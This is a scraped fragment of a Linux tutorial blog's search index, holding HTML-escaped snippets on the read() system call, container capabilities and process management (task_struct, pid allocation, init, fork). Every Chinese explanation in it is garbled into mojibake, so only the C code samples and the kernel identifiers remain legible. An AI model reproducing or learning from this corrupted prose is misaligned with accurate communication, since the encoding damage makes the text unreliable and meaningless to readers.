&lt;p&gt;ä»fdæ‰€å¼•ç”¨çš„æ–‡ä»¶çš„å½“å‰ä½ç½®è¯»å–lenä¸ªå­—èŠ‚åˆ°bufï¼Œæ‰§è¡ŒæˆåŠŸè¿”å›å†™å…¥bufçš„å­—èŠ‚æ•°ç›®ï¼Œæ‰§è¡Œå¤±è´¥è¿”å›-1å¹¶è®¾å®šerrnoã€‚æ–‡ä»¶ä½ç½®ä¼šå‰è¿›åˆ°fdæ‰€è¯»å–çš„å­—èŠ‚æ•°ç›®ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœfdä»£è¡¨çš„æ˜¯ä¸€ä¸ªå­—ç¬¦è®¾å¤‡æ–‡ä»¶ï¼Œåˆ™æ¯æ¬¡åªä¼šä»å½“å‰ä½ç½®è¯»å–æ•°æ®ã€‚&lt;/p&gt;
&lt;h3 id=&#34;readè¿‡ç¨‹ä¼šäº§ç”Ÿçš„é”™è¯¯&#34;&gt;readè¿‡ç¨‹ä¼šäº§ç”Ÿçš„é”™è¯¯&lt;/h3&gt;
&lt;p&gt;åœ¨readè¿‡ç¨‹ä¸­ä¼šå‡ºç°ä»¥ä¸‹æƒ…å†µï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è¿”å›å€¼ç­‰äºlenï¼Œå³é¢„æœŸç»“æœã€‚&lt;/li&gt;
&lt;li&gt;è¿”å›å€¼å°äºlenï¼Œä½†å¤§äº0ï¼Œå¯èƒ½åŸå› æ—¶å¯è¯»å–çš„å­—èŠ‚æ•°å°äºlenï¼Œæˆ–è€…æ”¶åˆ°ç³»ç»Ÿä¸­æ–­ä¿¡å·ã€‚&lt;/li&gt;
&lt;li&gt;è¿”å›0ï¼Œè¡¨ç¤ºEOFï¼Œåˆ°è¾¾äº†æ–‡ä»¶æœ«å°¾ã€‚&lt;/li&gt;
&lt;li&gt;è¿”å›-1ï¼Œerrno=EINTRï¼Œåœ¨è¯»å–å‰æ”¶åˆ°ä¸­æ–­ã€‚&lt;/li&gt;
&lt;li&gt;è¿”å›-1ï¼Œerror=EAGAINï¼Œè¡¨ç¤ºè¯»å–æ“ä½œè¢«é˜»æŒ¡ï¼Œå› ä¸ºå¯ä¾›è¯»å–çš„æ•°æ®å°šæœªå‡ºç°ï¼Œç¨ååº”è¯¥å†æ¬¡è¿›è¡Œè°ƒç”¨ï¼Œæ­¤æƒ…å†µåªå‘ç”Ÿåœ¨éé˜»å¡æ¨¡å¼ä¸­ã€‚&lt;/li&gt;
&lt;li&gt;è¿”å›å€¼-1ï¼Œerror=EINTRæˆ–EAGAINä»¥å¤–çš„å€¼ï¼Œè¡¨ç¤ºæ›´ä¸¥é‡çš„é”™è¯¯ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;è¯»å–æ‰€æœ‰å­—èŠ‚&#34;&gt;è¯»å–æ‰€æœ‰å­—èŠ‚&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;ssize_t ret;

while(len != 0 &amp;amp;&amp;amp; (ret = read(fd, buf, len)) != 0){
    if(ret == -1){
        if(errno == EINTR) continue;
        perror(&amp;quot;read&amp;quot;);
        break;
    }
    len -= ret;
    buf +=ret;
}
/*
ç¨‹åºå¾ªç¯ä¼šä»fdçš„å½“å‰æ–‡ä»¶ä½ç½®è¯»å–lenä¸ªå­—èŠ‚åˆ°bufã€‚å®ƒä¼šç»§ç»­è¯»å®Œlenä¸ªå­—èŠ‚æˆ–ç›´æ¥æŠµè¾¾EOFã€‚

å¦‚æœæ‰€è¯»å–çš„å­—èŠ‚æ•°ç›®å¤§äº0ï¼Œä½†å°äºlenï¼Œåˆ™lençš„å€¼ä¼šå‡å»å·²è¯»å–çš„å­—èŠ‚æ•°ç›®ï¼Œ
bufçš„å€¼ä¼šåŠ ä¸Šå·²è¯»å–çš„å­—èŠ‚æ•°ç›®ï¼Œå¹¶ä¸”å†æ¬¡è°ƒç”¨ï¼›
å¦‚æœè¿”å›-1ï¼Œerrno=EINTRï¼Œåˆ™ä¸éœ€è¦æ›´æ–°å‚æ•°å°±å¯ä»¥å†æ¬¡è¿›è¡Œæ­¤è°ƒç”¨ï¼›
å¦‚æœè¿”å›-1ï¼Œerrnoè®¾å®šä¸ºå…¶ä»–å€¼ï¼Œåˆ™ä¼šè°ƒç”¨perror()è¯´æ˜ç›¸å…³é”™è¯¯ï¼Œç»ˆæ­¢å¾ªç¯ã€‚
*/
&lt;/code&gt;&lt;/pre&gt;
">ã€linuxã€‘æ–‡ä»¶I/O</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-capability/"" data-c="
          &lt;p&gt;ä½¿ç”¨capsh -printå¯ä»¥è¾“å‡ºå½“å‰å®¹å™¨æ‰€å…·æœ‰çš„capæƒé™åˆ—è¡¨ã€‚ä½†å¹¶éæ‰€æœ‰å®¹å™¨å†…éƒ½æœ‰æ­¤å‘½ä»¤ï¼Œå¯ä»¥é€šè¿‡cat /proc/1/statusè·å–capçš„hexè®°å½•ï¼Œå†ä½¿ç”¨capsh --decodeè§£ç å‡ºcapã€‚&lt;/p&gt;
">ã€linuxã€‘capability</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-jin-cheng-guan-li/"" data-c="
          &lt;h2 id=&#34;è¿›ç¨‹&#34;&gt;è¿›ç¨‹&lt;/h2&gt;
&lt;p&gt;å¯¹äºæ“ä½œç³»ç»Ÿæ¥è¯´ï¼Œè¿›ç¨‹æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„æŠ½è±¡ï¼Œè¿›ç¨‹çš„æŠ½è±¡æ˜¯ä¸ºäº†æé«˜CPUçš„åˆ©ç”¨ç‡ï¼Œä»»ä½•çš„æŠ½è±¡éƒ½éœ€è¦ä¸€ä¸ªç‰©ç†åŸºç¡€ï¼Œè¿›ç¨‹çš„ç‰©ç†åŸºç¡€ä¾¿æ˜¯ç¨‹åºã€‚&lt;/p&gt;
&lt;h3 id=&#34;ç¨‹åºå’Œè¿›ç¨‹çš„åŒºåˆ«&#34;&gt;ç¨‹åºå’Œè¿›ç¨‹çš„åŒºåˆ«ï¼š&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿåˆ†é…å†…æ ¸ã€CPUæ—¶é—´ç‰‡ç­‰èµ„æºçš„åŸºæœ¬å•ä½ã€‚&lt;/li&gt;
&lt;li&gt;ç¨‹åºæ˜¯å®Œæˆç‰¹å®šä»»åŠ¡çš„æŒ‡ä»¤é›†åˆï¼ŒåŒ…å«å¯è¿è¡Œçš„ä¸€å †CPUæŒ‡ä»¤å’Œå“åº”çš„æ•°æ®ç­‰ä¿¡æ¯ï¼›è¿›ç¨‹ä¸ä»…åŒ…å«ä»£ç æ®µç­‰ä¿¡æ¯ï¼Œè¿˜æœ‰å¾ˆå¤šè¿è¡Œæ—¶éœ€è¦çš„èµ„æºã€‚&lt;/li&gt;
&lt;li&gt;è¿›ç¨‹æ˜¯ä¸€æ®µæ‰§è¡Œä¸­çš„ç¨‹åºï¼Œè¿›ç¨‹åŒ…å«äº†å¯æ‰§è¡Œä»£ç çš„ä»£ç æ®µï¼Œå­˜æ”¾å˜é‡ã€å‡½æ•°ã€è¿”å›å€¼ç­‰ä¿¡æ¯çš„ç”¨æˆ·æ ˆã€å­˜æ”¾è¿›ç¨‹ç›¸å…³æ•°æ®çš„æ•°æ®æ®µï¼Œç”¨äºå†…æ ¸ä¸­è¿›ç¨‹åˆ‡æ¢çš„å†…æ ¸æ ˆï¼Œä»¥åŠåŠ¨æ€åˆ†é…å†…å­˜çš„å †ç­‰ã€‚&lt;/li&gt;
&lt;li&gt;è¿›ç¨‹æ˜¯å¹¶å‘æ‰§è¡Œçš„ä¸€ä¸ªå®ä½“ï¼Œå®ç°å¯¹CPUçš„è™šæ‹ŸåŒ–çš„æ ¸å¿ƒæŠ€æœ¯æ˜¯&lt;strong&gt;ä¸Šä¸‹æ–‡åˆ‡æ¢&lt;/strong&gt;ä»¥åŠ&lt;strong&gt;è¿›ç¨‹è°ƒåº¦&lt;/strong&gt;ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;è¿›ç¨‹åˆ†ç±»&#34;&gt;è¿›ç¨‹åˆ†ç±»ï¼š&lt;/h3&gt;
&lt;p&gt;æ ¹æ®è¿è¡Œæ¨¡å¼åˆ†ä¸ºï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ ¸å¿ƒæ€è¿›ç¨‹&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·æ€è¿›ç¨‹&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ç”¨æˆ·æ€è¿›ç¨‹è¦æ‰§è¡Œä¸€äº›æ ¸å¿ƒæ€æŒ‡ä»¤ï¼Œä¼šäº§ç”Ÿç³»ç»Ÿè°ƒç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æ ¹æ®è¿›ç¨‹ç‰¹ç‚¹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;äº¤äº’è¿›ç¨‹(&lt;code&gt;shell&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;æ‰¹å¤„ç†è¿›ç¨‹&lt;/li&gt;
&lt;li&gt;å®ˆæŠ¤è¿›ç¨‹&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ ¹æ®è¿›ç¨‹çŠ¶æ€ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å®ˆæŠ¤è¿›ç¨‹(å®ˆæŠ¤è¿›ç¨‹çš„çˆ¶è¿›ç¨‹éƒ½æ˜¯initè¿›ç¨‹)&lt;/li&gt;
&lt;li&gt;å­¤å„¿è¿›ç¨‹(çˆ¶è¿›ç¨‹é€€å‡ºï¼Œå­è¿›ç¨‹è¢«initæ”¶å…»)&lt;/li&gt;
&lt;li&gt;åƒµå°¸è¿›ç¨‹(è¿›ç¨‹ç»“æŸï¼Œä½†æ²¡æœ‰é‡Šæ”¾å†…å­˜)&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;è¿›ç¨‹æè¿°ç¬¦&#34;&gt;è¿›ç¨‹æè¿°ç¬¦&lt;/h3&gt;
&lt;p&gt;è¿›ç¨‹æ‰€æ‹¥æœ‰çš„èµ„æºæŠ½è±¡ä¸ºè¿›ç¨‹æ§åˆ¶å—ï¼Œå³è¿›ç¨‹çš„èµ„æºåŠå±æ€§ä¿å­˜åœ¨è¿›ç¨‹æ§åˆ¶å—(PCB)ä¸­ï¼Œlinuxä¸­å®šä¹‰äº†&lt;code&gt;task_struct&lt;/code&gt;æ¥ä¿å­˜è¿›ç¨‹å±æ€§ã€‚&lt;/p&gt;
&lt;p&gt;PCBéœ€è¦æè¿°ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€ï¼šå°±ç»ªã€è¿è¡Œã€é˜»å¡ã€ç­‰å¾…ç­‰ç­‰&lt;/li&gt;
&lt;li&gt;ç¨‹åºè®¡æ•°å™¨ï¼šè®°å½•å½“å‰è¿›ç¨‹è¿è¡Œåˆ°å“ªæ¡æŒ‡ä»¤&lt;/li&gt;
&lt;li&gt;CPUå¯„å­˜å™¨ï¼šä¿å­˜å½“å‰è¿è¡Œçš„ä¸Šä¸‹æ–‡ï¼Œä¾‹å¦‚CPUå¯„å­˜å™¨ä¿¡æ¯ï¼Œä»¥ä¾¿è¿›ç¨‹è°ƒåº¦çš„æ•°æ®æ¢å¤&lt;/li&gt;
&lt;li&gt;CPUè°ƒåº¦ä¿¡æ¯ï¼šåŒ…æ‹¬è¿›ç¨‹ä¼˜å…ˆçº§ã€è°ƒåº¦é˜Ÿåˆ—å’Œè°ƒåº¦ç­‰ç›¸å…³ä¿¡æ¯&lt;/li&gt;
&lt;li&gt;å†…å­˜ç®¡ç†ä¿¡æ¯ï¼šè¿›ç¨‹ä½¿ç”¨çš„å†…å­˜ä¿¡æ¯ï¼Œæ¯”å¦‚è¿›ç¨‹çš„é¡µè¡¨ç­‰&lt;/li&gt;
&lt;li&gt;ç»Ÿè®¡ä¿¡æ¯ï¼šåŒ…å«è¿›ç¨‹è¿è¡Œæ—¶é—´ç­‰ç›¸å…³çš„ç»Ÿè®¡ä¿¡æ¯&lt;/li&gt;
&lt;li&gt;æ–‡ä»¶ç›¸å…³ä¿¡æ¯ï¼šåŒ…æ‹¬è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ç­‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;linuxå†…æ ¸åˆ©ç”¨é“¾è¡¨task_listæ¥å­˜æ”¾æ‰€æœ‰è¿›ç¨‹æè¿°ç¬¦ï¼Œtask_structæ•°æ®ç»“æ„&lt;strong&gt;å®šä¹‰&lt;/strong&gt;åœ¨include/linux/sched.hæ–‡ä»¶ä¸­ã€‚&lt;/p&gt;
&lt;h4 id=&#34;è¿›ç¨‹å±æ€§ç›¸å…³ä¿¡æ¯&#34;&gt;è¿›ç¨‹å±æ€§ç›¸å…³ä¿¡æ¯&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;stateï¼šè®°å½•è¿›ç¨‹çš„çŠ¶æ€ï¼Œä¸»è¦æœ‰TASK_RUNNING | TASK_INTERRUPTIBLE | TASK_UNINTERRUPTIBLE | EXIT_ZOMBIE | TASK_DEAD ç­‰å‡ ä¸ªçŠ¶æ€&lt;/li&gt;
&lt;li&gt;pidï¼šè¿›ç¨‹æ ‡è¯†ç¬¦&lt;/li&gt;
&lt;li&gt;flagï¼šè¿›ç¨‹å±æ€§æ ‡å¿—ä½ï¼Œæ ‡å¿—ä½å®šä¹‰åœ¨include/linux/schude.hä¸­ï¼Œä¾‹å¦‚ï¼Œç¨‹åºé€€å‡ºæ—¶è®¾ç½®PF_EXITINGï¼›è¿›ç¨‹æ˜¯ä¸€ä¸ªworkqueueç±»å‹çš„å·¥ä½œé¡¹æˆæ—¶ä¼šè®¾ç½®PF_WQ_WORKERï¼›forkå®Œæˆä¹‹åä¸æ‰§è¡Œexecå‘½ä»¤æ—¶ï¼Œä¼šè®¾ç½®PF_FORKNOEXECç­‰ã€‚&lt;/li&gt;
&lt;li&gt;exit_codeå’Œexit_signalæˆå‘˜ï¼šç”¨æ¥å­˜æ”¾è¿›ç¨‹é€€å‡ºå€¼å’Œç»ˆæ­¢ä¿¡å·ï¼Œè¿™æ ·çˆ¶è¿›ç¨‹å¯ä»¥çŸ¥é“å­è¿›ç¨‹çš„é€€å‡ºåŸå› &lt;/li&gt;
&lt;li&gt;pdeath_signalï¼šçˆ¶è¿›ç¨‹æ¶ˆäº¡æ—¶å‘å‡ºçš„ä¿¡å·&lt;/li&gt;
&lt;li&gt;commï¼šå­˜æ”¾å¯æ‰§è¡Œç¨‹åºçš„åç§°&lt;/li&gt;
&lt;li&gt;real_credå’Œcredï¼šç”¨æ¥å­˜æ”¾è¿›ç¨‹çš„ä¸€äº›è®¤è¯ä¿¡æ¯ï¼Œstruct credæ•°æ®ç»“æ„é‡ŒåŒ…å«äº†uidã€gidç­‰ä¿¡æ¯&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;è°ƒåº¦ç›¸å…³ä¿¡æ¯&#34;&gt;è°ƒåº¦ç›¸å…³ä¿¡æ¯&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;prioï¼šè¿›ç¨‹åŠ¨æ€ä¼˜å…ˆçº§ï¼Œæ˜¯è°ƒåº¦ç±»è€ƒè™‘çš„ä¼˜å…ˆçº§&lt;/li&gt;
&lt;li&gt;static_prioï¼šé™æ€ä¼˜å…ˆçº§ï¼Œåœ¨è¿›ç¨‹å¯åŠ¨æ—¶åˆ†é…ï¼Œå†…æ ¸ä¸å­˜å‚¨niceå€¼ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯static_prioã€‚&lt;/li&gt;
&lt;li&gt;normal_prioï¼šåŸºäºstatic_prioå’Œè°ƒåº¦ç­–ç•¥è®¡ç®—çš„ä¼˜å…ˆçº§&lt;/li&gt;
&lt;li&gt;tr_priorityï¼šå®æ—¶è¿›ç¨‹çš„ä¼˜å…ˆçº§&lt;/li&gt;
&lt;li&gt;sched_classï¼šè°ƒåº¦ç±»&lt;/li&gt;
&lt;li&gt;seï¼šæ™®é€šè¿›ç¨‹è°ƒåº¦å®ä½“&lt;/li&gt;
&lt;li&gt;rtï¼šå®æ—¶è¿›ç¨‹è°ƒåº¦å®ä½“&lt;/li&gt;
&lt;li&gt;dlï¼šdeadlineè¿›ç¨‹è°ƒåº¦å®ä½“&lt;/li&gt;
&lt;li&gt;policyï¼šç”¨æ¥ç¡®å®šè¿›ç¨‹çš„ç±»å‹ï¼Œæ¯”å¦‚æ˜¯æ™®é€šç±»å‹è¿˜æ˜¯å®æ—¶è¿›ç¨‹&lt;/li&gt;
&lt;li&gt;cpus_allowedï¼šè¿›ç¨‹å¯ä»¥åœ¨å“ªå‡ ä¸ªCPUä¸Šå·¥ä½œ&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;è¿›ç¨‹é—´å…³ç³»&#34;&gt;è¿›ç¨‹é—´å…³ç³»&lt;/h4&gt;
&lt;p&gt;ç³»ç»Ÿä¸­æœ€åˆçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹æ˜¯idleè¿›ç¨‹ï¼ˆ0å·è¿›ç¨‹ï¼‰ï¼Œæ­¤åæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªçˆ¶è¿›ç¨‹ï¼Œä¹Ÿå¯ä»¥åˆ›å»ºå­è¿›ç¨‹ï¼ŒåŒæ—¶ä¹Ÿå¯èƒ½æœ‰å…„å¼Ÿè¿›ç¨‹ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;real_parentï¼šæŒ‡å‘çˆ¶è¿›ç¨‹çš„task_structæ•°æ®ç»“æ„&lt;/li&gt;
&lt;li&gt;childrenï¼šæŒ‡å‘å½“å‰è¿›ç¨‹çš„å­è¿›ç¨‹çš„é“¾è¡¨&lt;/li&gt;
&lt;li&gt;siblingï¼šæŒ‡å‘å½“å‰è¿›ç¨‹çš„å…„å¼Ÿè¿›ç¨‹çš„é“¾è¡¨&lt;/li&gt;
&lt;li&gt;group_leaderï¼šè¿›ç¨‹ç»„çš„ç»„é•¿&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;å†…å­˜ç®¡ç†å’Œæ–‡ä»¶ç®¡ç†ç›¸å…³ä¿¡æ¯&#34;&gt;å†…å­˜ç®¡ç†å’Œæ–‡ä»¶ç®¡ç†ç›¸å…³ä¿¡æ¯&lt;/h4&gt;
&lt;p&gt;è¿›ç¨‹åœ¨åŠ è½½è¿è¡Œä¹‹å‰éœ€è¦åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå› æ­¤PCBé‡Œå¿…é¡»æœ‰ä¸€ä¸ªæŠ½è±¡æè¿°å†…å­˜ç›¸å…³çš„ä¿¡æ¯ï¼Œæœ‰ä¸€ä¸ªæŒ‡å‘mm_structæ•°æ®ç»“æ„çš„æŒ‡é’ˆmmã€‚æ­¤å¤–ï¼Œè¿›ç¨‹åœ¨ç”Ÿå‘½å‘¨æœŸå†…æ€»æ˜¯éœ€è¦é€šè¿‡æ‰“å¼€æ–‡ä»¶ã€è¯»å†™æ–‡ä»¶ç­‰æ“ä½œæ¥å®Œæˆä¸€äº›ä»»åŠ¡ï¼Œè¿™å°±å’Œæ–‡ä»¶ç³»ç»Ÿå¯†åˆ‡ç›¸å…³äº†ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mmï¼šæŒ‡å‘è¿›ç¨‹æ‰€ç®¡ç†çš„å†…å­˜çš„ä¸€ä¸ªæ€»çš„æŠ½è±¡çš„æ•°æ®ç»“æ„mm_struct&lt;/li&gt;
&lt;li&gt;fsæˆå‘˜ï¼šä¿å­˜ä¸€ä¸ªæŒ‡å‘æ–‡ä»¶ç³»ç»Ÿä¿¡æ¯çš„æŒ‡é’ˆ&lt;/li&gt;
&lt;li&gt;filesæˆå‘˜ï¼šä¿å­˜ä¸€ä¸ªæŒ‡å‘å†…å­˜çš„æ–‡ä»¶æè¿°ç¬¦è¡¨çš„æŒ‡é’ˆ&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;è¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ&#34;&gt;è¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1630227651424.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;è¿›ç¨‹æ ‡è¯†&#34;&gt;è¿›ç¨‹æ ‡è¯†&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;pidçš„åˆ†é…&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;çˆ¶è¿›ç¨‹ä¸ºppidï¼Œå†…æ ¸æœ€å¤§pidä¸º32768ï¼Œè¿™æ˜¯ä¸ºäº†å…¼å®¹æ—§ç‰ˆæœ¬unixç³»ç»Ÿï¼Œé‡‡ç”¨16ä¸ºæ•°æ®ç±»å‹ï¼Œå¯é€šè¿‡å¯¹&lt;code&gt;/proc/sys/kernel/pid_max&lt;/code&gt;ä¿®æ”¹ï¼Œä»£ä»·æ˜¯é™ä½å…¼å®¹æ€§ã€‚&lt;/p&gt;
&lt;p&gt;å†…æ ¸ä¼šä¸¥æ ¼ä½¿ç”¨çº¿æ€§æ–¹ç¨‹ä¸ºè¿›ç¨‹åˆ†é…pidï¼Œä½¿ç”¨è¿‡çš„pidä¸å†ä½¿ç”¨ï¼Œé™¤éè¶…è¿‡æœ€å¤§å€¼è€Œå¾ªç¯ä½¿ç”¨è¾ƒå°çš„pidã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å†…æ ¸ä¸­ï¼Œpidè¢«å®šä¹‰æˆ&lt;code&gt;pid_t&lt;/code&gt;ç±»å‹ï¼Œé€šå¸¸æ˜¯å¯¹intç±»å‹é‡æ–°å®šä¹‰(typedef)ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
    printf(&amp;quot;%d %d&amp;quot;, getpid(), getppid());
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;è¿›ç¨‹çš„å®¶æ—å…³ç³»&#34;&gt;è¿›ç¨‹çš„å®¶æ—å…³ç³»&lt;/h3&gt;
&lt;p&gt;linuxå†…æ ¸åœ¨å¯åŠ¨æ—¶ä¼šæœ‰ä¸€ä¸ªinit_taskè¿›ç¨‹ï¼Œå³0å·è¿›ç¨‹æˆ–idleè¿›ç¨‹ï¼Œç„¶ååˆå§‹åŒ–å®Œæˆåä¼šåˆ›å»ºä¸€ä¸ªinitè¿›ç¨‹ï¼Œå³1å·è¿›ç¨‹ï¼Œå®ƒæ˜¯æ‰€æœ‰è¿›ç¨‹çš„ç¥–å…ˆã€‚&lt;/p&gt;
&lt;p&gt;ç©ºé—²è¿›ç¨‹(idle process)ï¼špid=0ï¼Œå½“æ²¡æœ‰è¿›ç¨‹å¯è¿è¡Œæ—¶ï¼Œå†…æ ¸ä¼šè¿è¡Œæ­¤è¿›ç¨‹ã€‚&lt;br&gt;
åˆå§‹åŒ–è¿›ç¨‹(init process)ï¼špid=1ï¼Œç³»ç»Ÿå¯åŠ¨åå†…æ ¸æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;initè¿›ç¨‹ä¼šæŒ‰ç…§ä»¥ä¸‹å››ä¸ªé¡ºåºå°è¯•æ‰§è¡Œï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sbin/init&lt;/code&gt;ï¼šé¦–é€‰å’Œæœ€æœ‰å¯èƒ½æ‘†æ”¾initè¿›ç¨‹çš„ä½ç½®&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/init&lt;/code&gt;ï¼šå¦ä¸€ä¸ªå¯èƒ½æ‘†æ”¾initè¿›ç¨‹çš„ä½ç½®&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/bin/init&lt;/code&gt;ï¼šä¸€ä¸ªå¯èƒ½æ‘†æ”¾initè¿›ç¨‹çš„ä½ç½®&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/bin/sh&lt;/code&gt;ï¼šå¦‚æœå†…æ ¸æ— æ³•æ‰¾åˆ°initè¿›ç¨‹ï¼Œåˆ™ä¼šå°è¯•è¿è¡Œå®ƒ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¦‚æœéƒ½æ— æ³•æ‰§è¡Œï¼Œåˆ™å†…æ ¸ä¼šå‘ç”Ÿpanicè€Œåœæ­¢ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;å†…æ ¸å–å¾—æ§åˆ¶æƒåï¼Œç”±initè¿›ç¨‹è´Ÿè´£å¤„ç†å¯åŠ¨è¿‡ç¨‹çš„å‰©ä½™æ­¥éª¤ï¼ŒåŒ…æ‹¬åˆå§‹åŒ–ç³»ç»Ÿï¼Œå¯åŠ¨æœåŠ¡ä»¥åŠæ‰§è¡Œä¸€ä¸ªç™»å½•ç¨‹åºã€‚&lt;/p&gt;
&lt;p&gt;init_taskï¼ˆ0å·è¿›ç¨‹ï¼‰è¿›ç¨‹çš„task_structæ•°æ®ç»“æ„é€šè¿‡INIT_TASKå®æ¥èµ‹å€¼ï¼Œå®šä¹‰åœ¨include/linux/init_task.hæ–‡ä»¶ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;é™¤æ­¤ä¹‹å¤–ï¼Œæ‰€æœ‰è¿›ç¨‹çš„task_structæ•°æ®ç»“æ„éƒ½é€šè¿‡list_headç±»å‹çš„åŒå‘é“¾è¡¨é“¾åœ¨ä¸€èµ·ï¼Œå› æ­¤æ¯ä¸ªtask_structæ•°æ®ç»“æ„éƒ½åŒ…å«ä¸€ä¸ªlist_headç±»å‹çš„tasksæˆå‘˜ã€‚è¿™ä¸ªé“¾è¡¨çš„å¤´æ˜¯init_taskè¿›ç¨‹ï¼Œå³0å·è¿›ç¨‹ï¼Œinit_taskè¿›ç¨‹çš„tasks.prevå­—æ®µæŒ‡å‘é“¾è¡¨ä¸­æœ€åæ’å…¥çš„è¿›ç¨‹task_structæ•°æ®ç»“æ„çš„tasksæˆå‘˜ã€‚&lt;/p&gt;
&lt;p&gt;linuxæä¾›äº†ä¸€ä¸ªå¸¸ç”¨çš„å®for_each_process(p)ï¼Œæ¥æ‰«æç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹ï¼Œè¿™ä¸ªå®ä»init_taskè¿›ç¨‹å¼€å§‹éå†ï¼Œä¸€ç›´å¾ªç¯åˆ°init_taskä¸ºæ­¢ã€‚&lt;/p&gt;
&lt;h3 id=&#34;è¿è¡Œä¸€ä¸ªæ–°è¿›ç¨‹&#34;&gt;è¿è¡Œä¸€ä¸ªæ–°è¿›ç¨‹&lt;/h3&gt;
&lt;p&gt;åœ¨unixä¸­ï¼Œä¸€ä¸ªè¿›ç¨‹çš„åˆ›å»ºå…¶å®æ˜¯åŒ…æ‹¬ä¸¤ä¸ªæ­¥éª¤çš„ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åˆ›å»º(æ´¾ç”Ÿ)ä¸€ä¸ª&lt;strong&gt;æ–°è¿›ç¨‹&lt;/strong&gt;(fork)&lt;/li&gt;
&lt;li&gt;æ‰§è¡Œä¸€ä¸ª&lt;strong&gt;æ–°ç¨‹åº&lt;/strong&gt;(å°†æ–°ç¨‹åºåŠ è½½åˆ°å†…å­˜ä¸­æ‰§è¡Œ)(exec)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åœ¨unixä¸­ï¼Œè¿™ä¸¤ä¸ªæ­¥éª¤æ˜¯åˆ†å¼€çš„ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥åœ¨åˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œä¸€ä¸ªæ–°ç¨‹åºé€šå¸¸ä¼šå…ˆ&lt;code&gt;fork()&lt;/code&gt;ï¼Œç„¶å&lt;code&gt;exec()&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;h4 id=&#34;è¿›ç¨‹æ§åˆ¶å‡½æ•°&#34;&gt;è¿›ç¨‹æ§åˆ¶å‡½æ•°&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;fork()&lt;/code&gt;å‡½æ•°&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åˆ›å»ºå­è¿›ç¨‹ï¼Œå¹¶è¿è¡Œä¸å½“å‰è¿›ç¨‹ç›¸åŒçš„æ˜ åƒã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;unistd.h&amp;gt;
pid_t fork(void);
&lt;/code&gt;&lt;/pre&gt;
